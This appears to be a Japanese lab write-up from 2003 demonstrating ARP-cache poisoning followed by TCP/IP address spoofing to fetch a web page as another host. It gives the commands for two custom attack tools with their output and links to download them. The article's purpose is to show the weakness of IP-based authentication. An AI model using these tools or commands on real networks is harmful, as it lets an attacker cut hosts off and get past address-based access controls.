  IPスプーフィングというと、1994年にケビン・ミトニックがこの手法で下村努のコンピューターをクラックした事件が有名です。この巧妙なクラック技術は、現在の多くのシステムが実装しているランダムなシーケンス番号生成方法の前では、実行が困難となっていますが、逆を言えば、シーケンス番号さえ分かるならばスプーフィングが可能という事になります。という訳で、今回はこれを実証するため、ちょっと変わったIPスプーフィングの実験を行います。

  この実験は閉ざされたLAN(Local Area Network)内で行います。目的は、自分のIPアドレスを欺いてHTTPサーバーへ接続(実際には接続しない)、トップページを取得するというものです。送信元アドレスはLAN内に接続されているホストで、このホストとHTTPサーバー間を一時的に通信不能にしてIPスプーフィングを行います。なぜ、通信不能する必要があるのかというと、通信不能にせずIPスプーフィングを行うと、送信元ホストがRST(リセット)パケットをHTTPサーバーに送信してしまい、コネクションがリセットされてしまう為です。DOSアタックがIPスプーフィングの前兆と言われるのはこのためです。では、IPスプーフィングを行う手順を説明します。
  まず、ターゲットのHTTPサーバーへARPスプーフィングを実行して、送信元ホストとの通信を一時的に不能にします。次に、HTTPサーバーのポート80番へSYNフラグを立てたパケットを送信します。サーバーのポート80番が開いていれば、ACK+SYNで応答してくるので、３ウェイ・ハンドシェークの最終段階を実行してコネクションを確立させます。そのあと、GETコマンドを送信して 目的のファイルを取得します。この実験はスイッチで切られていないネットワーク、つまりダムハブで接続されたネットワークを使用します。これは、通常の手法ではスイッチングハブを使用すると、自分宛てでないパケットを補足できないからです。技術的には、スイッチングハブを使用してもパケットの補足は可能なのですが、これを始めると更に別の手順を踏む必要があるので、それについては別の機会に行いたいと思います。
  さて、IPスプーフィングを行うはずなのに、ARPスプーフィングなんてのが出てきて疑問を感じた方もいるでしょうから、パケットがネットワーク内に流れる過程を簡単に説明します。
  ホスト"hoge.com"へHTTPクライアントで接続すると仮定しましょう。まず、"hoge.com"のホスト名を解決するためにgethostbyname(3)を呼び出してホスト名の解決を試みます。ホスト名を解決したら、TCPへ宛先IPアドレスとのコネクションの確立を要求します。今回のように宛先ホストがローカルネットワーク内に接続されているならば、パケットを直接宛先ホストへ送信します。ここで、Ethernetで接続している場合、IPアドレスをEthernetアドレスへ変換させる必要があります。IPアドレスとEthernetアドレスの組み合わせをARPキャッシュで検索し、見つからないならばネットワーク内にARP要求を送信して解決を行います。
  ARPは確認応答の必要がないので、比較的簡単にスプーフィングが行えます。しかし、簡単といってもその影響は大きく、ネットワーク全体を通信不能する事も可能な、かなりアブナイものです。今回のARPスプーフィングは、ブロードキャストへ向けてHTTPサーバーのEthernetアドレス解決を行います。IPアドレスをスプーフィングに使用する送信元アドレスに設定して、Ethernetアドレスを架空のアドレスにします。ARP要求を受け取ったHTTPサーバーは、偽の要求に反応して送信元アドレスのEthernetアドレスを架空のアドレスに更新します。HTTPサーバーは更新された架空のEthernetアドレスと通信を行おうとするため、通信不能となってしまいます。
  試してみましょう。実験用に作成した"fakearp"を使用して、192.168.64.1と192.168.64.5間の通信を妨害してみます。まずはarpテーブルを確認しましょう。

(192.168.64.5)
C:\>arp -a

Interface: 192.168.64.5 on Interface 0x1000003
  Internet Address      Physical Address      Type
  192.168.64.1          00-0a-79-27-c6-d2     dynamic

C:\>

この状態で192.168.64.1にPingを飛ばすと、正常に反応がある事を確認出来ます。

C:\>ping 192.168.64.1

Pinging 192.168.64.1 with 32 bytes of data:

Reply from 192.168.64.1: bytes=32 time<10ms TTL=64
Reply from 192.168.64.1: bytes=32 time<10ms TTL=64
Reply from 192.168.64.1: bytes=32 time<10ms TTL=64
Reply from 192.168.64.1: bytes=32 time<10ms TTL=64

Ping statistics for 192.168.64.1:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum =  0ms, Average =  0ms

C:\>

192.168.64.1のEthernetアドレスを"aa-bb-cc-dd-ee-ff"に更新させて192.168.64.1との通信を不能にします。

# fakearp 192.168.64.5 -shw aa:bb:cc:dd:ee:ff -spa 192.168.64.1 -i eth1

このコマンドを実行するとARPテーブルが更新されます。
(192.168.64.5)
C:\>arp -a

Interface: 192.168.64.5 on Interface 0x1000003
  Internet Address      Physical Address      Type
  192.168.64.1          aa-bb-cc-dd-ee-ff     dynamic

C:\>

この時点で、192.168.64.1と192.168.64.5間はARPキャッシュが切れるか、正しいアドレスに更新されるまで通信不能となり、Pingを飛ばしても返ってくる事はありません。

C:\>ping 192.168.64.1

Pinging 192.168.64.1 with 32 bytes of data:

Request timed out.
Request timed out.
Request timed out.
Request timed out.

Ping statistics for 192.168.64.1:
    Packets: Sent = 4, Received = 0, Lost = 4 (100% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum =  0ms, Average =  0ms

C:\>

192.168.64.1がインターネットへのゲートウェイである場合、LANから出る事が出来ずインターネットへの接続は出来なくなります。更に付け加えておくと、fakearpはデフォルトでは宛先ハードウェアアドレスがFF:FF:FF:FF:FF:FF(ブロードキャスト)のパケットを送信するので、このパケットを受け取った全てのマシンが通信不能となる危険性があります。ピンポイントで行うには宛先ハードウェアアドレスを指定して下さい。

  今回はIPスプーフィングを目的としているので、ARPスプーフィングについてはここまでとして、偽のTCPコネクションを確立させる過程を追って行きます。
  TCPは接続指向であるため、クライアント／サーバー間でコネクションの確立を行います。コネクションの確立と再転送やフロー制御等をTCPレベルで行うためヘッダーサイズが20バイトと、UDPの倍以上ありますが信頼性を保証します。IP, TCPヘッダーは次のような構成になっています。

IPヘッダー(RFC791から抜粋)
    0                   1                   2                   3
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |Version|  IHL  |Type of Service|          Total Length         |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |         Identification        |Flags|      Fragment Offset    |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |  Time to Live |    Protocol   |         Header Checksum       |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                       Source Address                          |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                    Destination Address                        |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                    Options                    |    Padding    |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

TCPヘッダー(RFC793から抜粋)
    0                   1                   2                   3
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |          Source Port          |       Destination Port        |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                        Sequence Number                        |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                    Acknowledgment Number                      |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |  Data |           |U|A|P|R|S|F|                               |
   | Offset| Reserved  |R|C|S|S|Y|I|            Window             |
   |       |           |G|K|H|T|N|N|                               |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |           Checksum            |         Urgent Pointer        |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                    Options                    |    Padding    |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                             data                              |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

コネクションの確立を行うには、まず宛先ホストの接続したいポートへSYNフラグを立てたパケットを送信します。ポートが開いているならば、ACK+SYNで応答してくるので、ACKフラグを立てたパケットを送信してコネクションを確立させます。分かり易く説明すると、次のような行程となります。

  Client                                                      Server
  +                                                                +
  |                                                                |
  |seq: 1000, ack: 0(SYN)                                          |
  +-------->-------->-------->-------->-------->-------->-------->>>
  |                                                                |
  |                                    seq: 5000, ack 1001(ACK+SYN)|
  <<<--------<--------<--------<--------<--------<--------<--------+
  |                                                                |
  |seq: 1001, ack: 5001(ACK)                                       |
  +-------->-------->-------->-------->-------->-------->-------->>>
  |                                                                |
  +                                                                +

クライアントはシーケンス番号に1000を設定して接続要求を出しています。これに応答するサーバーはシーケンス番号に5000を設定して、確認応答番号にクライアントの設定したシーケンス番号に1を足した1001を設定して応答します。最後にクライアントはサーバーの設定した確認応答番号ををシーケンス番号に、シーケンス番号に1を足した5001を確認応答番号に設定して、パケットを送信します。このパケットをサーバーが受け取った時点でコネクションが確立します。このように3段階に渡ってやり取りを行うため、「3ウェイ・ハンドシェーク」や「3ステップ・ハンドシェーク」などと呼ばれます。

実験に使用するネットワークの構成は次のようなものです。

攻撃者<Linux>
[192.168.64.3]-------------------[HUB]
                                  | |
                                  | |      HTTPサーバー<NetBSD>
[192.168.64.5]--------------------+ +------[192.168.64.4]
偽装されるホスト<Windows NT>

192.168.64.4では、HTTPサーバーとしてApacheが動作しており、トップページのindex.htmlには次のような内容のファイルを用意しました。

(index.html)
--------8<------------------8<--------

<html>
ヽ(´ー`)ノ＜よっ！成功かい？
</html>

--------8<------------------8<--------

まず、192.168.64.4へARPスプーフィングを実行して192.168.64.5との通信を不能にしておきます。このコマンドを実行すると、HTTPサーバーは192.168.64.5と通信が出来なくなります。

[r00t@192.168.64.3]# fakearp 192.168.64.4 -spa 192.168.64.5 -shw 00:fe:7f:1c:86:fa -i eth1

次にIPスプーフィングを実行して、サーバーへの接続・トップページの取得を試みます。
勿論、実際に接続する事はありません。偽の接続です。

[r00t@192.168.64.3]# ./hs http://192.168.64.4/ -s 192.168.64.5
phase 1 - Send SYN to 192.168.64.4 (seq 0x42e7ffd5 ack 0x0)... Success
phase 2 - Recv ACK from 192.168.64.4... Success (seq 0x779c8f1e ack 0x42e7ffd6)
phase 3 - Send ACK to 192.168.64.4 (seq 0x42e7ffd6 ack 0x779c8f1f)... Success
phase 4 - Send GET to 192.168.64.4 (seq 0x42e7ffd6 ack 0x779c8f1f)... Success
HTTP/1.1 200 OK
Date: Thu, 02 Oct 2003 07:40:40 GMT
Server: Apache/1.3.27 (Unix)
Last-Modified: Wed, 01 Oct 2003 16:46:11 GMT
ETag: "7cf4e-2d-3f7b04d3"
Accept-Ranges: bytes
Content-Length: 45
Connection: close
Content-Type: text/html

<html>
ヽ(´ー`)ノ＜よっ！成功かい？
</html>

phase 5 - recved FIN
phase 6 - Final, send ACK|FIN to 192.168.64.4... Success

トップページが取得出来たので、HTTPサーバー上でログファイルを確認して、アクセスしてきたアドレスを調べてみます。

[r00t@192.168.64.4]# cat access_log
192.168.64.5 - - [02/Oct/2003:16:40:40 +0900] "GET / HTTP/1.0" 200 45

192.168.64.5がリモートホストとして記録されています。次にnetstatで送信元アドレスが偽装出来ている事を確認しましょう。

[r00t@192.168.64.4]# netstat -an
Active Internet connections (including servers)
Proto Recv-Q Send-Q  Local Address          Foreign Address        State
tcp        0      0  192.168.64.4.80        192.168.64.5.38892     TIME_WAIT
tcp        0      0  *.80                   *.*                    LISTEN
tcp        0      0  *.23                   *.*                    LISTEN
tcp        0      0  *.21                   *.*                    LISTEN
udp        0      0  *.1013                 *.*
Active UNIX domain sockets
Address  Type   Recv-Q Send-Q    Inode     Conn     Refs  Nextref Addr
c084a000 dgram       0      0 c3e09804        0        0        0 /var/run/log

  このように、簡単にアドレスを偽装出来る事が確認出来ました。これは何もHTTPに限らず、他のプロトコルでも実行可能で、たとえTcpwrapperやファイアウォールで保護していても、許可しているアドレスさえ分かれば容易に突破出来ることは想像に固くないでしょう。これは明らかにセキュリティーホールであり、IPアドレスで認証を行う危険性を表しています。

  使用したテストプログラムは以下のURLからダウンロード出来ます。コンパイル・実行はこれを書いている時点ではLinux/NetBSDで確認しています。fakearpは/dev/bpf* が存在するならば、多少修正するだけでコンパイル可能だと思うので、失敗した方は自分で修正してください。このプログラムは簡単に実行出来ますが、場合によってはネットワークに大きな影響を与えかねないので、十分に注意して下さい。httpspoof(hs)は大抵のUnixでコンパイル・実行出来るはずなので、これも失敗した方は自分で修正等を行って下さい。ちなみに、libpcapが必要です。

http://idzero.s35.xrea.com/release/tools/fakearp.html
http://idzero.s35.xrea.com/samples/httpspoof.tgz

  今回は馴染の少ないデータリンク層に触れているものの、十分に解説が出来ておらず、分かりづらい個所があると思います。Ethernetアドレス関連については、Vol.1「MACアドレス再考」でIPUSIRONさんが解説しているので、そちらを参照して下さい。
